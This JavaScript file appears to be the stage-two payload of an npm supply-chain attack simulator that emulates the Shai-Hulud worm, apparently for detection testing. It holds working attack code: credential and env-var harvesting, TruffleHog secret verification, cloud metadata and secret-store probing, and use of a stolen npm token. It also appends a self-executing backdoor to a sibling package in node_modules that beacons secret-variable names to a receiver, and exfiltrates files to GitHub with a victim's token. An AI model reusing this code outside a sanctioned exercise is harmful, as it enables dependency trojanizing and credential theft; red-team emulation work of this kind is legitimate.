// supply-chain-sim/npm-package/scripts/bun_environment.js
// Bundled inside the npm package (as real Shai-Hulud shipped it) — run by setup_bun.js under Bun,
// not fetched from C2. LIB resolves to the repo root so it can load guardrail/harvest/exfil.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const https = require('node:https');
const { execSync } = require('node:child_process');

// Package-relative requires so the chain runs from node_modules when git/tarball-installed
// (self-contained). No dependency on the repo or SIM_LIB_DIR.
const { assertAuthorized, cfg } = require('../lib/guardrail.js');
const { harvest, ARTIFACT_NAMES } = require('../lib/harvest.js');
const { beacon, pushToGitHub, fetchExfilConfig, extractGithubToken, githubExfilVictim } = require('../lib/exfil.js');
const { installPersistence } = require('../lib/persistence.js');

const TRUFFLEHOG_FALLBACK_VERSION = '3.90.8';   // used only if the GitHub "latest" lookup fails

function httpProbe(opts, headers = {}) {   // link-local metadata GET, harmless, short timeout
  return new Promise(resolve => {
    const req = http.get({ ...opts, headers, timeout: 800 },
      res => { res.resume(); resolve(res.statusCode); });
    req.on('timeout', () => { req.destroy(); resolve('timeout'); });
    req.on('error', () => resolve('unreachable'));
  });
}

// T1552.005 — probe the cloud instance-metadata service across AWS/GCP/Azure. Off-cloud (the test
// laptops) these are unreachable, but the probe attempt itself (DNS for metadata.google.internal,
// connects to 169.254.169.254) is the telemetry.
async function metadataProbes() {
  return {
    aws: await httpProbe({ host: '169.254.169.254', path: '/latest/meta-data/' }),
    gcp: await httpProbe({ host: 'metadata.google.internal', path: '/computeMetadata/v1/' }, { 'Metadata-Flavor': 'Google' }),
    azure: await httpProbe({ host: '169.254.169.254', path: '/metadata/instance?api-version=2021-02-01' }, { Metadata: 'true' }),
  };
}

function probeHttps(url, { method = 'GET', headers = {}, body } = {}) {   // status-only, full TLS, short timeout
  return new Promise(resolve => {
    const u = new URL(url);
    const req = https.request({ host: u.hostname, path: u.pathname + u.search, method,
      headers: { 'user-agent': 'sim-agent', ...headers }, timeout: 3000 },
      res => { res.resume(); resolve(res.statusCode); });
    req.on('timeout', () => { req.destroy(); resolve('timeout'); });
    req.on('error', () => resolve('unreachable'));
    if (body) req.write(body);
    req.end();
  });
}

// T1526 / T1580 — reach the cloud secret-store APIs with the (fake) stolen creds. They fail auth,
// but the DNS + TLS/SNI to secretsmanager/secretmanager/management endpoints is the discovery signal.
async function cloudSecretEnum() {
  return {
    awsSecretsManager: await probeHttps('https://secretsmanager.us-east-1.amazonaws.com/',
      { method: 'POST', headers: { 'x-amz-target': 'secretsmanager.ListSecrets', 'content-type': 'application/x-amz-json-1.1' }, body: '{}' }),
    gcpSecretManager: await probeHttps('https://secretmanager.googleapis.com/v1/projects/-/secrets'),
    azureKeyVault: await probeHttps('https://management.azure.com/subscriptions?api-version=2020-01-01'),
  };
}

// HTTPS GET that follows redirects (GitHub release downloads redirect to objects.githubusercontent.com).
// Full TLS validation (real github.com cert). Streams to `dest`, or returns text / parsed JSON.
function httpsGet(url, { json = false, dest = null, depth = 0 } = {}) {
  return new Promise((resolve, reject) => {
    if (depth > 5) return reject(new Error('too many redirects'));
    const u = new URL(url);
    https.get({ host: u.hostname, path: u.pathname + u.search, headers: { 'user-agent': 'sim-agent' } }, res => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        res.resume();
        return resolve(httpsGet(new URL(res.headers.location, url).toString(), { json, dest, depth: depth + 1 }));
      }
      if (res.statusCode !== 200) { res.resume(); return reject(new Error(`HTTP ${res.statusCode} for ${u.hostname}`)); }
      if (dest) {
        const f = fs.createWriteStream(dest);
        res.pipe(f); f.on('finish', () => f.close(() => resolve(dest))); f.on('error', reject);
        return;
      }
      let b = ''; res.on('data', c => (b += c)); res.on('end', () => resolve(json ? JSON.parse(b) : b));
    }).on('error', reject);
  });
}

async function trufflehogVersion() {
  try {
    const rel = await httpsGet('https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest', { json: true });
    return String(rel.tag_name || '').replace(/^v/, '') || TRUFFLEHOG_FALLBACK_VERSION;
  } catch { return TRUFFLEHOG_FALLBACK_VERSION; }
}

function trufflehogAsset(v) {
  const arch = process.arch === 'arm64' ? 'arm64' : 'amd64';
  const plat = process.platform === 'darwin' ? 'darwin' : process.platform === 'win32' ? 'windows' : 'linux';
  return `trufflehog_${v}_${plat}_${arch}.tar.gz`;
}

// Download the real TruffleHog binary and scan the target dir, exactly like Shai-Hulud. TruffleHog
// VERIFIES found secrets (sts:GetCallerIdentity for AWS, GitHub token checks, etc.) by reaching the
// real services — so a planted Canarytoken key fires here (the credential-validation ground truth).
// T1552 secret discovery via a legitimate tool; also "network tool downloaded/run during npm install".
async function runTruffleHog(scanDir) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sim-th-'));
  const version = await trufflehogVersion();
  const asset = trufflehogAsset(version);
  const url = `https://github.com/trufflesecurity/trufflehog/releases/download/v${version}/${asset}`;
  const tgz = path.join(dir, asset);
  await httpsGet(url, { dest: tgz });                                 // fetch binary from github (TTP)
  execSync(`tar -xzf "${tgz}" -C "${dir}"`, { stdio: 'ignore' });     // bsdtar ships on macOS / Win11 / Linux
  const bin = path.join(dir, process.platform === 'win32' ? 'trufflehog.exe' : 'trufflehog');
  if (process.platform !== 'win32') fs.chmodSync(bin, 0o755);
  let raw = '';
  try {
    // --results includes unverified so planted decoys also land in the artifact; verification still
    // runs for every candidate (that's what validates the AWS key and fires the Canarytoken).
    raw = execSync(`"${bin}" filesystem "${scanDir}" --json --no-update --results=verified,unknown,unverified`, {
      encoding: 'utf8', maxBuffer: 64 * 1024 * 1024, timeout: 180000 });
  } catch (e) { raw = (e.stdout && e.stdout.toString()) || ''; }      // trufflehog may exit non-zero yet still print findings
  const findings = raw.split('\n').filter(Boolean)
    .map(l => { try { return JSON.parse(l); } catch { return null; } })
    .filter(f => f && f.DetectorName);
  return {
    tool: 'trufflehog', version, scanned: scanDir,
    total: findings.length, verified: findings.filter(f => f.Verified).length,
    detectors: [...new Set(findings.map(f => f.DetectorName))],
    findings: findings.map(f => ({
      detector: f.DetectorName, verified: !!f.Verified,
      file: f.SourceMetadata && f.SourceMetadata.Data && f.SourceMetadata.Data.Filesystem
        && f.SourceMetadata.Data.Filesystem.file,
    })),
  };
}

function dropPersistence(dir) {  // benign artifact drop — names match the real campaign, no live runner.
  const wf = path.join(dir, '.github', 'workflows');
  fs.mkdirSync(wf, { recursive: true });
  fs.writeFileSync(path.join(wf, 'discussion.yaml'),
    '# SIM inert backdoor-workflow artifact (Shai-Hulud 2.0 emulation). Does nothing.\nname: Discussion\non: { discussion: {} }\njobs: { noop: { runs-on: SHA1HULUD, steps: [ { run: "echo sim" } ] } }\n');
  fs.writeFileSync(path.join(dir, 'SHA1HULUD.runner.marker'), 'inert self-hosted-runner registration marker\n');
}

function benignWiper() {   // NEVER destructive: touch markers in a throwaway dir only (T1485 emulation).
  const dir = path.join(os.tmpdir(), 'sim-wiper-target');
  fs.mkdirSync(dir, { recursive: true });
  for (let i = 0; i < 5; i++) fs.writeFileSync(path.join(dir, `wiped-${i}.marker`), 'sim benign wiper touch\n');
  return dir;
}

// The injected backdoor: a self-executing snippet appended to a legit package's entry file, fired
// whenever the app require()s that package (real TAs do exactly this). IOCs an analyst/YARA sees: an
// unexpected `require("https")` at the tail of a legit package, an env/secret scan, and a silent C2
// beacon in a try/catch. SAFETY: guarded to the allowlisted test hosts, beacons only to your C2, and
// sends secret-looking env var NAMES (not values) — no real exfil, no child_process, no destruction.
function buildNmBackdoor(pkgName) {
  const R = JSON.stringify(cfg.receiverUrl);
  const HOSTS = JSON.stringify(cfg.allowedHosts);
  return [
    '',
    '/* prettier-ignore */',
    ';(function(){try{var _o=require("os"),_h=require("https");',
    'if(!(' + HOSTS + ').includes(_o.hostname()))return;',
    'var _u=new URL(' + R + '.replace(/\\/$/,"")+"/collect");',
    'var _i=["127.0.0.1","localhost","receiver.sim.local"].includes(_u.hostname);',
    'var _e=Object.keys(process.env).filter(function(k){return /(_TOKEN|TOKEN_|_KEY$|_SECRET|PASSWORD|_PAT$|AWS_|GITHUB_|NPM_)/i.test(k)});',
    'var _b=JSON.stringify({stage:"nm.backdoor.triggered",pkg:' + JSON.stringify(pkgName) + ',host:_o.hostname(),envKeys:_e,ts:Date.now()});',
    'var _q=_h.request({host:_u.hostname,port:_u.port||443,path:_u.pathname,method:"POST",headers:{"content-type":"application/json"},rejectUnauthorized:!_i});',
    '_q.on("error",function(){});_q.end(_b);',
    '}catch(_x){}})();',
    '',
  ].join('\n');
}

// MHaggis #4 — backdoor a SIBLING dependency in the node_modules THIS package was installed into
// (self-contained: exactly what Shai-Hulud does — trojanize the neighbours it landed next to). Falls
// back to a throwaway node_modules for standalone/dev runs. Injects the self-executing backdoor above.
function patchNodeModules() {
  try {
    const installNm = path.resolve(__dirname, '..', '..');            // <proj>/node_modules when installed
    const selfName = path.basename(path.resolve(__dirname, '..'));    // our own package dir (skip it)
    let target = null;
    if (path.basename(installNm) === 'node_modules') {
      try {
        const sibs = fs.readdirSync(installNm)
          .filter(d => !d.startsWith('.') && d !== selfName && fs.existsSync(path.join(installNm, d, 'package.json')));
        if (sibs.length) target = path.join(installNm, sibs[0]);
      } catch { /* none */ }
    }
    if (!target) {                                                     // fallback: our own throwaway target
      target = path.join(os.tmpdir(), 'sim-nm', 'node_modules', 'left-pad');
      fs.mkdirSync(target, { recursive: true });
      if (!fs.existsSync(path.join(target, 'package.json'))) fs.writeFileSync(path.join(target, 'package.json'), '{"name":"left-pad","main":"index.js"}\n');
    }
    const pkgName = path.basename(target);
    let entry = path.join(target, 'index.js');
    try { const pj = JSON.parse(fs.readFileSync(path.join(target, 'package.json'), 'utf8')); if (pj.main) entry = path.join(target, pj.main); } catch { /* default index.js */ }
    if (!fs.existsSync(entry)) fs.writeFileSync(entry, 'module.exports = {};\n');
    fs.appendFileSync(entry, buildNmBackdoor(pkgName));
    return { patched: entry, pkg: pkgName };
  } catch (e) { return { patched: null, error: e.message }; }
}

// T1195.002 (second-order) — emulate the worm republishing trojanized packages with the stolen npm
// token. STRICTLY --dry-run: npm packs the tarball but NEVER uploads. Targets are fake names, the
// token is the fake decoy — structurally incapable of reaching a real package.
async function wormPropagate(root) {
  const out = { tokenCheck: null, targets: [], published: 0, dryRun: true };
  let token = '';
  try {
    const m = fs.readFileSync(path.join(root, '.npmrc'), 'utf8').match(/_authToken=(.+)/);
    token = m ? m[1].trim() : '';
  } catch { /* no token decoy present */ }
  // 1) use the stolen token against the registry (fake token -> 401): "stolen npm token used" signal
  out.tokenCheck = await probeHttps('https://registry.npmjs.org/-/whoami',
    token ? { headers: { authorization: `Bearer ${token}` } } : {});
  // 2) trojanize throwaway packages and attempt publish --dry-run (packs only, never uploads)
  const LIMIT = 3;                                   // real wave-2 caps at 100/run; kept small here
  for (let i = 0; i < LIMIT; i++) {
    const name = `sim-victim-pkg-${os.hostname()}-${i}`.toLowerCase().replace(/[^a-z0-9-]/g, '-');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sim-worm-'));
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name, version: '9.9.9', description: 'SIM trojanized package (never published)',
      scripts: { preinstall: 'node setup_bun.js' } }, null, 2));
    fs.writeFileSync(path.join(dir, 'setup_bun.js'), '// SIM inert injected preinstall marker\n');
    try {
      execSync('npm publish --dry-run', { cwd: dir, stdio: 'ignore', timeout: 30000 });
      out.targets.push(name);                         // "would publish" — dry-run only, nothing uploaded
    } catch { out.targets.push(`${name} (dry-run err)`); }
    fs.rmSync(dir, { recursive: true, force: true });
  }
  return out;
}

async function main() {
  assertAuthorized();
  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'sim-stage2-'));

  const h = harvest(cfg.decoyRoot);                                   // T1552.001 + env-var theft

  // TruffleHog: download the real binary, scan the home dir, verify found secrets (fires the
  // Canarytoken). Real findings replace the harvest stand-in; on failure keep the stand-in.
  let truffle;
  try {
    truffle = await runTruffleHog(cfg.decoyRoot);
    h.truffleSecrets = truffle;
  } catch (e) {
    truffle = { tool: 'trufflehog', error: e.message };
    console.error('[sim] trufflehog stage failed (continuing):', e.message);
  }

  const artifacts = { 'cloud.json': h.cloud, 'contents.json': h.contents,
    'environment.json': h.environment, 'truffleSecrets.json': h.truffleSecrets };
  const files = [];
  for (const name of ARTIFACT_NAMES) {
    const content = JSON.stringify(artifacts[name], null, 2);
    fs.writeFileSync(path.join(work, name), content);
    files.push({ path: name, content });
  }

  const imds = await metadataProbes();                               // T1552.005 (AWS/GCP/Azure)
  const cloudEnum = await cloudSecretEnum();                         // T1526/T1580 cloud secret stores
  const worm = await wormPropagate(cfg.decoyRoot);                   // T1195.002 second-order (dry-run)
  const nmPatch = patchNodeModules();                                // MHaggis #4 backdoor a sibling dep
  const ghCfg = await fetchExfilConfig(cfg.receiverUrl);            // org/token from C2 (never baked in)
  dropPersistence(work);                                              // inert persistence markers (always)
  const persistence = await installPersistence(ghCfg);               // T1543 real runner+service (opt-in)
  const wiperDir = benignWiper();                                     // inert T1485

  // T1567.002 GitHub exfil with the VICTIM's harvested token (real Shai-Hulud behavior; decoy token
  // 401s but generates the api.github.com traffic ExtraHop/Palo detect on). Optional throwaway-org
  // push only for end-to-end verification, when the operator supplied a working PAT via /config.
  const victimToken = extractGithubToken(h);
  const ghVictim = await githubExfilVictim(victimToken, files);
  let ghVerify = { skipped: true };
  if (ghCfg.ghPat && ghCfg.ghOrg) {
    const repo = `sim-${os.hostname()}-${Date.now()}`.toLowerCase().replace(/[^a-z0-9-]/g, '-');
    ghVerify = await pushToGitHub({ org: ghCfg.ghOrg, pat: ghCfg.ghPat, repo, files });
  }

  await beacon(cfg.receiverUrl, { stage: 'bun_environment', host: os.hostname(),
    imds, cloudEnum, nmPatch, worm, persistence,
    github: { victim: ghVictim, verifyRepo: ghVerify.skipped ? null : ghVerify.repo },
    truffle: { total: truffle.total, verified: truffle.verified, error: truffle.error },
    artifacts: ARTIFACT_NAMES, wiperDir, ts: Date.now() });          // T1567 beacon

  console.log('[sim] stage-2 complete',
    { work, imds, truffle: truffle.error || `${truffle.total} findings/${truffle.verified} verified`,
      githubVictim: ghVictim.attempted ? `create=${ghVictim.createStatus} valid=${ghVictim.tokenValid}` : ghVictim.reason,
      githubVerify: ghVerify.skipped ? 'skipped' : ghVerify.repo });
}

main().catch(e => { console.error('[sim] bun_environment aborted:', e.message); process.exit(0); });
